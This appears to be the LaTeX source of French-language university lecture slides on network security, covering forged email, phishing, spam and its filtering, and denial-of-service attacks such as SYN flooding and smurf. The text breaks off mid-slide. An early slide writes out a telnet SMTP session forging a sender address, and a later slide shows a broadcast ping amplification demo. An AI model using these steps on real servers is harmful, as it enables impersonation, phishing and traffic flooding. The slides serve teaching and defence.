@@ -1,0 +1,2436 @@
+
+%\documentclass[landscape]{slides}
+\documentclass{beamer}
+\usepackage{beamerfoils}
+\usetheme{Pittsburgh}
+%\usepackage[accumulated]{beamerseminar}
+                                % remove ``accumulated'' option
+                                % for original behaviour
+%\usepackage{beamerthemeclassic}
+\usepackage{ulem}
+\usepackage{comment}
+%\usepackage{beamerthemesplit}
+
+%\usepackage{beamerthemeshadow}
+
+%\usepackage{beamerthemeplain}
+%\usepackage{times}
+\usepackage{colortbl}
+\usepackage{pifont}
+%\usepackage{lslide}
+\def\emptyline{\vspace{10pt}}
+\usepackage{amssymb}
+%\usepackage{french}
+\usepackage[latin1]{inputenc}
+%\usepackage[T1]{fontenc}
+\usepackage[]{color}
+%\usepackage[pdftex]{color}
+%\usepackage[]{colorlslide,epsfig}
+%\usepackage{amsfonts,stmaryrd}
+\usepackage{epsfig}
+
+\usepackage{graphicx,array}
+\usepackage{amsmath}%,amsthm}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{multicol}
+
+%\renewcommand{\frame}{\end{slide}   \begin{slide}}
+%\newcommand{\frametitle}{\centerline}
+ 
+
+%\usepackage{beamerthemeshadow}
+\usepackage{graphicx}
+%\usepackage{beamerthemesplit}
+
+\definecolor{bluesky}{rgb}{0.8,0.95,1}
+
+%%%%%%%%%%%%%%%%%% ENVIRONEMENT %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\newtheorem{deft}{Définition}
+%\newtheorem{theorem}{Théorème}
+\newtheorem{proposition}{Proposition}
+\newtheorem{exemple}{Exemple}
+\newtheorem{postulat}{Postulat}
+
+
+%%%%%%%%%%%%%%%%%% COULEURS %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%\definecolor{coltitle}{rgb}{0.1, 0.1, 0.543}
+%\definecolor{colitemi}{rgb}{0, 0.75, 0.99}
+%\definecolor{colexemp}{rgb}{0.6, 0.4, 0}
+%\definecolor{colmult}{rgb}{0, 1, 0}
+\definecolor{grey}{rgb}{0.4, 0.4, 0.7}
+\definecolor{encre}{rgb}{0.2, 0, 0.4}
+%\definecolor{grisbleu}{rgb}{0.8, 0.8, 1}
+%\definecolor{cadre}{rgb}{0.7, 0.7, 0.7}
+%\definecolor{cadresubsec}{rgb}{0, 0.3, 0.3}
+%\definecolor{cadreombre}{rgb}{0.8, 0.8, 0.8}
+%\definecolor{colsection}{rgb}{0.4, 0.2, 0.2}
+
+%\definecolor{bleur}{rgb}{0.3, 0, 0.6}
+%\definecolor{bleuv}{rgb}{0, 0.3, 0.6}
+%\definecolor{rougeb}{rgb}{0.6, 0, 0.3}
+%\definecolor{rougev}{rgb}{0.6, 0.3, 0}
+%\definecolor{rougealert}{rgb}{1., 0.2, 0}
+%\definecolor{vertr}{rgb}{0.3, 0.6, 0}
+%\definecolor{vertb}{rgb}{0, 0.6, 0.3}
+%\definecolor{blanc}{rgb}{1, 1, 1}
+
+\newcommand{\red}[1]{\only<#1>{\color{red}}}
+\newcommand{\green}[1]{\only<#1>{\color{green}}}
+\newcommand{\lra}{\leftrightarrow}
+\newcommand{\Fd}{\mathbb{F}}
+\newcommand{\enlight}[1]{\textit{\color{blue}#1}}
+
+%%   for the headline etc.
+\renewcommand\normalcolor{\color{coltitle}}
+\newcommand{\blue}{\color{blue}}
+\setbeamercolor{block body}{bg=bluesky} 
+
+%%   for the background
+%\pagecolor{grisbleu}
+%%   for the text
+\color{encre}
+
+%%%%%%%%%%%%%%% voir le style ....
+ \beamertemplatenavigationsymbolsempty
+\beamertemplatefootempty
+%\beamertemplatefootframenumber
+\setbeamertemplate{footline}[frame number]
+
+
+\title{Sécurité des Réseaux Informatiques}
+
+\AtBeginSection[]
+{
+\begin{frame}
+\frametitle{Plan}
+\begin{multicols}{2}
+\tableofcontents[currentsection,sectionstyle=show,subsectionstyle=show]
+\end{multicols}
+\end{frame}
+}
+
+\AtBeginSubsection[]
+{
+\begin{frame}
+\frametitle{Plan}
+\begin{multicols}{2}
+\tableofcontents[currentsubsection,sectionstyle=show/shaded,subsectionstyle=show/shaded]%/hide
+\end{multicols}
+
+\end{frame}
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{document}
+
+\maketitle
+
+
+\section{Courrier électronique} 
+
+\subsection{Courriel forgé}
+
+\begin{frame}
+
+
+\frametitle{Courrier électronique forgé}
+
+Forger un courrier électronique peut être utilisé à des fins: 
+\begin{itemize}
+\item criminelles,
+\item pour du harcèlement,
+\item de la diffamation,
+\item soutirer ou révéler des informations sensibles.
+\end{itemize}
+
+C'est  l'une des attaques les plus faciles à mettre en oeuvre. 
+\begin{itemize}
+\item Le protocole SMTP repose sur quatre commandes: \texttt{HELO, MAIL FROM, RCPT TO, DATA}.
+\item Un message peut être directement envoyé à un serveur SMTP via une connexion telnet.
+\item Aucune vérification de l'adresse de l'expéditeur n'est effectuée!
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Exemple d'envoi d'email via SMTP}
+\begin{verbatim}
+$telnet smpt.univ-perp.fr 25
+HELO elysee.fr
+Trying 194.167.137.6...
+Connected to smtp.univ-perp.fr.
+Escape character is '^]'.
+MAIL FROM: chirac@elysee.fr
+250 OK
+RCPT TO: cedric.legrand@univ-perp.fr
+250 OK
+DATA
+Ceci est un mail forge.
+.
+250 OK
+QUIT
+connection closed by forein host.
+\end{verbatim}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Exemple d'envoi d'email  : mail re\c cu}
+
+\begin{center}
+\includegraphics[width=10cm]{courriel-forge-chirac.jpeg}
+\end{center}
+
+\end{frame}
+
+
+
+
+
+\begin{frame}[fragile]
+\frametitle{Source du mail re\c cu}
+\begin{tiny}
+\begin{verbatim}
+Return-Path: <chirac@elysee.fr>
+Received: from cyrus.univ-perp.fr ([unix socket])
+	 by cyrus (Cyrus v2.2.12-Invoca-RPM-2.2.12-3.RHEL4.1) with LMTPA;
+	 Fri, 05 Apr 2013 17:17:41 +0200
+X-Sieve: CMU Sieve 2.2
+Received: from localhost (localhost [127.0.0.1])
+	by cyrus.univ-perp.fr (Postfix) with ESMTP id 8BDD72CB3BF
+	for <clegrand@cyrus.univ-perp.fr>; Fri,  5 Apr 2013 17:17:41 +0200 (CEST)
+Received: from cyrus.univ-perp.fr ([127.0.0.1])
+ by localhost (cyrus.univ-perp.fr [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 29817-10 for <clegrand@cyrus.univ-perp.fr>;
+ Fri,  5 Apr 2013 17:17:41 +0200 (CEST)
+Received: from smtp.univ-perp.fr (smtp.univ-perp.fr [194.167.137.6])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(No client certificate requested)
+	by cyrus.univ-perp.fr (Postfix) with ESMTP id C07832CB2E8
+	for <clegrand@cyrus.univ-perp.fr>; Fri,  5 Apr 2013 17:17:40 +0200 (CEST)
+Received: from elysee.fr (delldali.univ-perp.fr [194.167.138.24])
+          by smtp.univ-perp.fr (8.13.1/jtpda-5.4) with SMTP id r35FGQUv009974
+          for cedric.legrand@univ-perp.fr; Fri, 5 Apr 2013 17:16:54 +0200
+Date: Fri, 5 Apr 2013 17:16:26 +0200
+From: chirac@elysee.fr
+Message-Id: <201304051516.r35FGQUv009974@smtp.univ-perp.fr>
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-3.0 (smtp.univ-perp.fr [194.167.137.6]); Fri, 05 Apr 2013 17:16:54 +0200 (CEST)
+To: undisclosed-recipients: ;
+X-Virus-Scanned: amavisd-new at univ-perp.fr
+
+Ceci est un mail forge.
+\end{verbatim}
+\end{tiny}
+
+\end{frame}
+
+
+\begin{frame}
+Plusieurs lignes ont été rajoutées dans l'entête:
+\begin{itemize}
+\item Chaque serveur recevant/retransmettant le courriel insère une ligne {\color{blue}\texttt{Received:}} qui indique le nom et l'IP de la machine  lui ayant  transmis
+ le courriel.
+\item Il est possible de tracer l'email jusqu'à la machine source: ici machine avec l'IP 194.167.138.24.
+\item Cette source peut être masquée par l'utilisation de machine publique (cyber café) ou réseau publique et adresse MAC clonée.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Phishing}
+\begin{itemize}
+\item Le phishing consiste à envoyer un courriel \textit{contrefait} se faisant passer par exemple pour un administrateur réseau ou un courrier officiel d'une banque demandant des informations sensibles.
+\item
+La récupération d'information peut se faire par le biais d'un site web falsifié mimant le site officiel de la banque ou autre.
+\end{itemize}
+\end{frame}
+\begin{frame}
+\frametitle{Phishing : Exemple}
+\begin{center}
+\includegraphics[width=8cm]{Email_account_phishing_fr.jpg}
+\end{center}
+\end{frame}
+
+\subsection{Courriel indésirable}
+
+\begin{frame}
+\frametitle{Courrier électronique indésirable (SPAM)}
+
+\begin{itemize}
+\item Le fait que les courriels peuvent être envoyés avec de fausses adresses permet l'envoi massif d'email 
+\item L'auteur du mail se protège en masquant son identité.
+\item Ce type d'email indésirable est communément appelé SPAM (ou plus rarement pourriel).
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Courrier électronique indésirable (SPAM)}
+
+La notion de courrier \textit{indésirables} étant subjective  la classification d'un courrier envoyé en masse comme du spam est délicate:
+\begin{itemize}
+\item La CNIL propose la définition suivante:
+
+\begin{itshape}
+Constituent des spam les messages adressés sur la base d'une collecte irrégulière de courriel soit au moyen de moteurs de recherche dans les espaces publics de l'Internet soit que les adresses aient été cédées sans que les personnes en aient été informées et sans qu'elles aient été en mesure de s'y opposer ou d'y consentir. 
+\end{itshape}
+\item L'aspect concernant la collecte d'adresse est discutable, le Syndicat National de la Communication Directe propose la définition suivante
+
+\begin{itshape}
+Adresses collectées de manière déloyale, envoi ne respectant pas les modalités d'utilisation précisées lors de la collecte; courriel ne permettant pas une désinscription sélective ou totale. 
+\end{itshape}
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Historique}
+
+Il est difficile de dater l'apparition du premier spam:
+\begin{itemize}
+\item Certains l'attribue à Gary Thuerk employé chez DEC qui envoya en 1978 un courrier publicitaire à l'ensemble des utilisateurs d'ARPAnet ($\cong$ une centaines de personnes).
+
+
+\item D'autres l'attribue à L. Canter et M. Siegel, deux avocats spécialisé dans les affaires d'immigration, qui ont envoyé en 1994 un seul spam à plusieurs millions de personnes. 
+\item Ils ont envoyés sur 6000 groupes de diffusion un message faisant la publicité de leur service pour l'obtention de la \textit{green card}, ils ont recu 25 000 réponses, leur rapportant 100 000 dollars.
+\item En contrepartie ils ont été plusieurs fois condamnés et même Canter a été radié du barreau en 1997. 
+\end{itemize}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Technique de diffusion du spam - Relais ouverts}
+
+\begin{itemize}
+\item Le fait de recevoir un spam est surtout une nuisance.
+\item C'est la fa\c con dont il est distribué qui crée des problèmes de sécurité.
+\item L'envoi d'email à des millions d'adresses nécessite des ressources importantes.
+\item Un serveur relais est un serveur de courriel d'une entreprise qui est utilisé par des utilisateurs extérieurs (auteurs de spam) pour envoyer leur propre courriel.
+\end{itemize}
+\end{frame}
+
+
+
+
+
+\begin{frame}
+\frametitle{Diffusion du spam : Serveur Relais}
+\begin{itemize}
+\item Il est plus efficace pour l'auteur d'un spam qu'il l'envoie une copie à plusieurs serveurs de courrier (SMTP) et une liste de plusieurs milliers d'adresse email.
+\item Pour l'entreprise dont le serveur mail est abusé:
+\begin{itemize}
+\item Durant le temps de l'envoie des mails (qq minutes ou heures) le serveur est surchargé par l'envoie des spams. 
+\item Le serveur ne peut même plus gérer les emails interne à l'entreprise.
+\item Si l'entreprise est de petite taille, la connexion internet est elle aussi surchargée. 
+\item Le disque dur du serveur se remplit de log de confirmation de courriers bien délivrés.
+\item La boîte de courriel de l'admin se remplit de message d'erreur pour les adresses email invalides. 
+\item Le FAI de l'entreprise peut menacer de couper la connexion internet s'il recoit des plaintes de destinataires de spam. 
+\item Le serveur abusé risque d'être placé sur liste noire, et les futurs courriels  ``normaux'' risqueront d'être rejetés.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}[fragile]
+\frametitle{Exemple de  spam}
+
+\includegraphics[width=12cm]{spam.jpeg}
+
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Exemple de  spam - code source}
+\begin{tiny}
+\begin{verbatim}
+Return-Path: <tecnici@italcave.it>
+Received: from cyrus.univ-perp.fr ([unix socket])
+	 by cyrus (Cyrus v2.2.12-Invoca-RPM-2.2.12-3.RHEL4.1) with LMTPA;
+	 Wed, 27 Feb 2013 08:21:23 +0100
+X-Sieve: CMU Sieve 2.2
+Received: from localhost (localhost [127.0.0.1])
+	by cyrus.univ-perp.fr (Postfix) with ESMTP id 4DA042CADD5
+	for <clegrand@cyrus.univ-perp.fr>; Wed, 27 Feb 2013 08:21:23 +0100 (CET)
+Received: from cyrus.univ-perp.fr ([127.0.0.1])
+ by localhost (cyrus.univ-perp.fr [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 16302-03 for <clegrand@cyrus.univ-perp.fr>;
+ Wed, 27 Feb 2013 08:21:23 +0100 (CET)
+Received: from smtp.univ-perp.fr (smtp.univ-perp.fr [194.167.137.6])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(No client certificate requested)
+	by cyrus.univ-perp.fr (Postfix) with ESMTP id 383D52CADCE
+	for <clegrand@cyrus.univ-perp.fr>; Wed, 27 Feb 2013 08:21:23 +0100 (CET)
+Received: from [92.252.33.117] (xdsl-92-252-33-117.dip.osnanet.de [92.252.33.117])
+          by smtp.univ-perp.fr (8.13.1/jtpda-5.4) with ESMTP id r1R7JqG2005320
+          for <cedric.legrand@univ-perp.fr>; Wed, 27 Feb 2013 08:20:33 +0100
+From: "edwin annette" <tecnici@italcave.it>
+To: <cedric.legrand@univ-perp.fr>
+Subject: vous avez 1 message en attente
+Date: 27 Feb 2013 07:45:42 +0000
+Message-ID: <002301ce14c3$07831fdf$af86e1a8$@italcave.it>
+
+This is a multi-part message in MIME format.
+------=_NextPart_000_0020_01CE14C3.0781D5E2
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Salut
+Cette m&#233;thode a chang&#233; ma vie, Il peut changer la v&#244;tre auss=i!
+------=_NextPart_000_0020_01CE14C3.0781D5E2
+\end{verbatim}
+\end{tiny}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Diffusion du spam - Règles pour éviter l'utilisation d'un serveur relais}
+
+%Un serveur relais est un serveur de courriel d'une entreprise qui est utilisé par des utilisateurs extérieurs (auteurs de spam) pour envoyer leur propre courriel.
+
+
+Pour éviter qu'un serveur de courriel ne devienne un relais ouvert on doit appliquer les règles suivantes:
+\begin{enumerate}
+\item Pour qu'un message soit accepté par le serveur de courrier, soit l'adresse de l'expéditeur, soit celle du destinataire doit appartenir au domaine du serveur : cela évite l'utilisation du serveur comme  relais.
+\item Seuls les systèmes appartenant au même domaine que le serveur peuvent envoyer du courrier avec un expéditeur faisant partie du domaine : cela empêche des utilisateurs extérieurs de se faire passer pour des utilisateurs locaux.
+\end{enumerate}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Diffusion du spam :Spambots}
+
+Aujourd'hui une part importante du traffic de spam provient de spambot (ou robot spammeur):
+\begin{itemize}
+\item Un \textit{robot} est une machine compromise qui obéit aux ordres d'un maître.
+\item La compromission d'une machine peut se faire grâce à un virus ou via des failles de sécurité de la machine.
+\item Un robot élémentaire consiste en un relais SMTP ouvert à tous et en particulier aux auteurs du spam
+\item Un robot plus élaboré se connecte à un serveur de discussion (par exemple un canal IRC = Internet Relay Chat) et se met en écoute des commandes du maître.
+Le maître se connecte sur le canal et envoie ses ordres à tous les robots connectés au canal.
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Diffusion du spam : Messagerie gratuite en ligne}
+
+Une dernière technique pour diffuser du spam consiste à abuser des messageries gratuites en lignes (Hotmail, Yahoo mail, gmail, ...):
+\begin{itemize}
+\item Tous ces webmails limitent le nombre de courriels qui peuvent être envoyés.
+\item Les diffuseurs de spam créent des scripts pour ouvrir automatiquement des milliers de nouveaux comptes.
+\item Les scripts alors envoient pour chacun des comptes une quantité limité de courriels.
+\item Les opérateurs de messagerie en ligne se protège contre les créations de comptes automatiques par des \textit{captchas}, devinettes graphiques sensées être déchiffrable que par un humain.  
+\end{itemize}
+\end{frame}
+
+\subsection{Lutte contre le spam}
+
+\begin{frame}
+\frametitle{Filtrage}
+
+Le filtrage peut porter 
+\begin{itemize}
+\item sur le contenu contient-il les mots clefs Viagra, XXL, etc. ;
+\item des paramètres de l'en-tête du courrier (temps de transit, ...) ;
+\item le format des messages (titre du message en lettre capitales, ...).
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Filtrage : Spamassassin}
+
+
+Spamassassin est un logiciel de lutte contre le spam qui utilise des règles de filtrage:
+\begin{itemize}
+\item Des centaines de règles peuvent être appliquées lors du traitement ;
+\item A chaque règle est attribuée un poids relié l'importance de la règle.
+\item A l'issu de l'analyse les poids sont combiné pour donner un score au message : au dessous d'un certain seuil les message est accepté, au dessous le message est rejeté.
+\end{itemize}
+
+Ce type d'approche a clairement des limites: si les règles sont mal ajustés des spams peuvent passer à travers le filtre et des mails réguliers peuvent êtres rejetés par erreur.
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Spamassassin, un exemple de scoresheet}
+
+\begin{tiny}
+\begin{verbatim}
+Received: from localhost (unknown [81.185.105.205])
+     by mwinf8216.laposte.net (SMTP Server) with ESMTP id 3CDC73C0008D for
+     john.smith@laposte.net; Mon, 08 Jun 2009 23:37:51 +02000 (CEST)
+Date: Mon, 08 Jun 2009 23:10:34 +0200
+From Information 34556299773-send@yahoo.fr
+Subject: Spam? Pour votre information.
+(...)
+X-SpamCheck: polluriel, SpamAssassin
+   score=19.452,
+   requis 5,
+   BAYES_50 1.00,
+   DCC_CHECK 2.17, 
+   DIGEST_MULTIPLE  0.00,
+   FROM_LOCAL_DIGITS  0.00,
+   FROM_LOCAL_HEX 1.40,
+   FROM_STARTS_WITH_NUMS 1.50,
+   HTML_IMAGE_ONLY 1.53,
+   HTML_IMAGE_RATIO_02  0.38,
+   HTML_MESSAGE  0.00, 
+   MIME_HTML_MOSTLY  0.00,
+   NUMERIC_HTTP_ADDR 0.00,
+   RAZOR2_CF_RANGE_51_100 0.50,
+   RAZOR2_CF_RANGE_E4_51_100 1.50,
+   RAZOR2_CF_RANGE_E8_51_100 1.50,
+   RAZOR2_CHECK 0.50,
+   RCVD_IN_DNSWL_LOW -1.00,
+   RCVD_IN_SORBS 2.00,
+   SARE_FROM_SPAM_WORD3 0.10,
+   UNPARSEABLE_RELAY 0.00,
+   URIBL_JP_SURBL 3.00,
+   URIBL_WS_SURBL 3.00, 
+   URI_HEX 0.37
+X-Spam-Status: Yes
+\end{verbatim}
+\end{tiny}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Liste noires et liste blanches}
+
+Une approche de lutte contre le spam consiste à utiliser des listes noires et blanches:
+\begin{itemize}
+\item Une liste noire contient des adresses IP de machines qui envoient du spam.% Il peut s'agir de machines utilisées exclusivement pour cela ou des machines compromises qui le font à leur insu.
+Exemple de liste : celle gérée par Spamhous Project.
+\item  Une liste blanche contient des adresses IP, noms de domaines ou expéditeurs de confiance.% c'est à dire qui sont connus pour ne pas envoyer de spam. Une liste blanche est généralement.
+ Utilisée en complément d'une autre méthode de lutte contre le spam pour éviter le rejet de mail de correspondant régulier.
+
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Signature de spam}
+\begin{itemize}
+\item Un spam est envoyé à des millions d'exemplaire sur des plage de temps relativement longue (plusieurs jours à plusieurs mois) 
+\item On peut mutualiser les efforts : des bases de données de signature de spams (signature = portion  discriminante du message)  sont stockées sur des serveurs.
+\item  Il est alors possible d' interroger la base de données pour vérifier si un courriel suspect est un spam ou non.
+\item L'alimentation de la base de données se fait soit de facon collaborative ou par utilisation/diffusion d'adresse mail cible facile de spammeurs.
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Liste grise}
+
+Cette technique consiste à détecter les comportement ``bourrin'' de certains diffuseurs de spams:
+\begin{itemize}
+\item Lors de la réception d'un email d'un expéditeur: le mail est bloqué, l'adresse IP et l'adresse email de l'émetteur est stockée et l'email est jeté.
+\item Le protocole SMTP prévoit, lors de la perte d'un message, la ré-émission du message par le serveur SMTP expéditeur.
+\item Lorsque le message est recu pour la seconde fois, le message est alors remis dans la boîte au lettre du destinataire.
+\item Les serveurs qui envoient des spams par grosse quantité ne se soucis pas de ré-émettre des messages perdus ou rejetés. Ce sont eux que détecte la technique de la liste grise.
+\item Cette technique est inefficace contre les spambots.
+\end{itemize}
+\end{frame}
+
+\subsection{Modèle économique du spam}
+
+\begin{frame}
+\frametitle{Modèle économique du spam}
+
+Le modèle économique de Canter et Siegel dans les années 90 était simple:
+\begin{itemize}
+\item l'envoie de spam avait pour objectif de faire connaître leur activité, 
+\item les bénéfices qu'ils en retiraient provenaient ensuite exclusivement de leur travail d'avocat.
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Modèle économique du spam}
+Aujourd'hui la situation est plus complexe, une économie s'est mise en place:
+\begin{itemize}
+\item Ceux qui collectent les adresses peuvent vendre ou louer leur liste d'adresse. Cette activité
+est légale car les adresses sont collectées sur le domaine publique et lors de la vente 
+les acheteurs attestent du fait qu'ils ne vont pas utiliser les adresses pour envoyer des pourriels.
+
+\item Ceux qui envoient du spam sont rémunérés en louant leurs serveurs ou leurs services comme la mise à disposition de réseau de spambot.
+
+\item Les auteurs des spams à proprement dit qui diffusent une information pouvant avoir un intérêt directe vente en lignes engendrés par le message ou la publicité.
+
+\item Le but du spam lui même peut servir à collecter des adresses.
+
+\end{itemize}
+
+
+\end{frame}
+
+%\section{Vulnérabilité des applications et des réseaux}
+
+\section{Vulnérabilité des applications et des réseaux}
+\subsection{Dénis de service}
+
+\begin{frame}
+\frametitle{Le dénis de service (DOS) qu'est ce que c'est?}
+\begin{itemize}
+\item Une attaque par déni de service consiste à empêcher un système informatique de fonctionner correctement.
+\item Une technique très répandu est d'envoyer ou de rediriger un  trafic tellement important de requêtes que le serveur se retrouve noyé sous les requête et ne peut plus répondre à de nouvelle requête légitime.
+\item Le but de l'inondation peut aussi d'être de monopoliser d'autre type de ressource: nombre de connexions simultanées ou la mémoire disponible.
+\item Les dénis de service les plus intéressant sont ceux qui peuvent être effectués de fa\c con anonyme.
+\end{itemize}
+\end{frame}
+
+\begin{frame}[t]
+\frametitle{SYN flooding - Rappel du mécanisme d'ouverture de connexion TCP}
+
+
+\begin{columns}[t]
+ \begin{column}{0.3\textwidth}
+\begin{center}
+\includegraphics[width=3.5cm]{tcp-initialization}
+\end{center}
+\end{column}
+ \begin{column}{0.7\textwidth}
+%L'initialisation d'une connexion se fait comme suit:
+\begin{small}
+\begin{itemize}
+\item Le  client envoie un paquet SYN (le bit SYN = 1  le bit ACK = 0). Le numéro de séquence $x$ est le numéro de séquence initial (ISN).
+Le numéro d'acquittement est zéro  car l'ISN du serveur est inconnu.
+%\item Le numéro d'acquittement est zéro car le client ne connaît pas encore les numéros de séquence des données provenant du serveur.
+\item Le serveur répond par un paquet SYN-ACK (le bit SYN = 1 et le bit ACK = 1). Le numéro de séquence $y$ est le  numéro de séquence initial (ISN) choisit par le serveur, le numéro d'aquitement est $x+ 1$.
+\item Le client répond au SYN-ACK par un segment ACK (SYN est à 0 et le bit ACK est à 1), le numéro de séquence est  $x+1$, le numéro d'ACK est $y + 1$.
+\end{itemize}
+\end{small}
+\end{column}
+\end{columns}
+\end{frame}
+
+\begin{frame}
+\frametitle{SYN flooding}
+\begin{itemize}
+\item Le SYN flooding est l'une des plus anciennes attaques de déni de service:
+\item Cela consiste à consommer toutes les ressources de la couche TCP d'un ordinateur.
+%Comme nous l'avons vu à la section 3.1 les paquets SYN sont utilisés pour initier les connexions TCP
+\item Lors de l'initialization d'une connextion TCP, à la réception du paquet SYN,  \alert{le serveur met cette connexion dans une file d'attente}.
+\item Le but de l'attaque est de  maintenir la file d'attente constamment remplie ce qui a pour conséquence que le serveur refuse systématiquement de nouvelle connexion.
+\item Notons que l'attaquant peut utilisé des adresses IP arbitraire vu qu'il n'est pas intéressé par mené à bien les connexion TCP.
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{SYN flooding - parades}
+\begin{itemize}
+\item Les connexion en attente sont retirée de la file si l'ACK attendu n'arrive pas dans un délai raisonnable.
+\item Linux et FreeBSD évite le SYN flooding en utilisant des SYN Cookies: 
+\begin{itemize}
+\item Le serveur ne maintient plus de file d'attente,
+\item Les informations concernants la connection sont encodé dans l'ISN, avec un mini-mécanisme de signature pour éviter des falsification.
+\item A la réception de l'ACK le serveur récupère les informations des ``vrai'' client et peut poursuivre la communication TCP en mode connecté.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Attaque smurf}
+\begin{itemize}
+\item L'attaque smurf consiste à noyer la victime dans un flux de de réponses ICMP.
+\item Rappel: ICMP est un protocole utilisé pour vérifier qu'une machine est atteignable sur le réseau.
+\item Quand une machine recoit \textit{\color{red} ICMP echo request} elle envoie un paquet \textit{\color{red}ICMP echo reply} à l'adresse IP source indiquée dans le paquet
+ \begin{center}
+\includegraphics[width=3.5cm]{icmp-request}
+\end{center}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Attaque smurf}
+\begin{itemize}
+\item Pour attaquer une cible avec des {\color{red} réponses ICMP}, le pirate inscrit l'adresse cible comme adresse IP source dans l'en-tête IP du paquet ICMP de la requête.
+\item La destination de la requête enverra ainsi sa réponse à la cible.
+\item La cible ne saura d'ailleurs pas qui lui veut du mal.
+\item Pour amplifier son attaque le pirate peut envoyer sa requête à une adresse de diffusion réseau.
+\end{itemize}
+
+\begin{center}
+\includegraphics[width=6cm]{schema-smurf.jpeg}
+\end{center}
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Attaque smurf}
+Par exemple l'adresse par exemple on a fait un \texttt{ping -b 194.167.138.255} effectué à partir d'une machine dans le même sous-réseau les machines 194.167.138.??? du sous-réseau  
+ ont répondu 
+\begin{scriptsize}
+\begin{verbatim}
+64 bytes from 194.167.138.168: icmp_req=7 ttl=64 time=0.337 ms
+64 bytes from 192.168.138.150: icmp_req=7 ttl=254 time=0.356 ms (DUP!)
+64 bytes from 194.167.138.177: icmp_req=7 ttl=255 time=0.369 ms (DUP!)
+64 bytes from 194.167.138.180: icmp_req=7 ttl=64 time=0.373 ms (DUP!)
+64 bytes from 194.167.138.112: icmp_req=7 ttl=64 time=0.377 ms (DUP!)
+64 bytes from 194.167.138.240: icmp_req=7 ttl=64 time=0.380 ms (DUP!)
+64 bytes from 194.167.138.27: icmp_req=7 ttl=64 time=0.383 ms (DUP!)
+64 bytes from 192.168.138.1: icmp_req=7 ttl=255 time=0.740 ms (DUP!)
+64 bytes from 194.167.138.219: icmp_req=7 ttl=64 time=0.761 ms (DUP!)
+64 bytes from 194.167.138.163: icmp_req=7 ttl=64 time=0.765 ms (DUP!)
+64 bytes from 194.167.138.181: icmp_req=7 ttl=64 time=0.768 ms (DUP!)
+64 bytes from 194.167.138.161: icmp_req=7 ttl=64 time=0.772 ms (DUP!)
+64 bytes from 194.167.138.199: icmp_req=7 ttl=64 time=0.775 ms (DUP!)
+.
+.
+.
+\end{verbatim}
+\end{scriptsize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Attaque smurf}
+
+\begin{itemize}
+\item L'utilisation de paquets ICMP est un exemple classique d'une attaque par réflexion amplifiée. 
+\item Les pirates trouvent régulièrement d'autres manières de relayer et d'amplier leurs attaques.
+\item Ils sont en particulier friand d'application utilisant les paquets UDP  et qui génèrent des messages d'erreur plus longs que la requête du pirate.
+\item Pour limiter la multiplication de trafic à l'aide d'adresse de diffusion, beaucoup de routeur sont configurés pour ne pas relayer de paquet provenant de l'extérieur d'un sous-réseau. 
+\end{itemize}
+\end{frame}
+
+%\subsection{Dénis de service distribués (DDoS)}
+
+\begin{frame}
+\begin{itemize}
+\item La manière la plus efficace de réaliser un déni de service est d'avoir à ses ordres un grand nombre de machines qui vont simultanément attaquer une seule cible.
+\item Ce type de dénis de service distribués est apparu dès 1999. 
+\item Des \textit{backdoors} ou \textit{porte dérobée} sont installées malicieusement sur les machines  par le biais de  failles de sécurités ou de virus.
+\item Ces machines infectées s'appellent bots (robots) ou zombies et ne communiquent pas directement avec le pirate mais par le biais d'un autre serveur (e.g. chat IRC ou encore twitter).
+\end{itemize}
+\end{frame}
+
+\begin{frame} 
+\frametitle{Dénis de service - un peu d'Histoire}
+\begin{itemize}
+\item La première attaque DoS médiatisée a été un SYN flooding contre le fournisseur d'accès à Internet Panix dans le New Jersey en 1996.
+\item Cela s'est produit une semaine après la publication dans \textit{Phrax} et \textit{2600} du code source nécessaire pour effectuer un SYN flooding.
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame} 
+\frametitle{Dénis de service  - un peu d'Histoire}
+L'an 2000 a vu apparaitre les premières attaques DDoS:
+\begin{itemize}
+\item Le 7 février le portail Yahoo fut inaccessibl ependant plusieurs heures.
+\item Le 8 février Amazon, Buy.com, eBay et CNN étaient à leur tour victime d'une attaque.
+\item Le 9 février E Trade et ZDNet
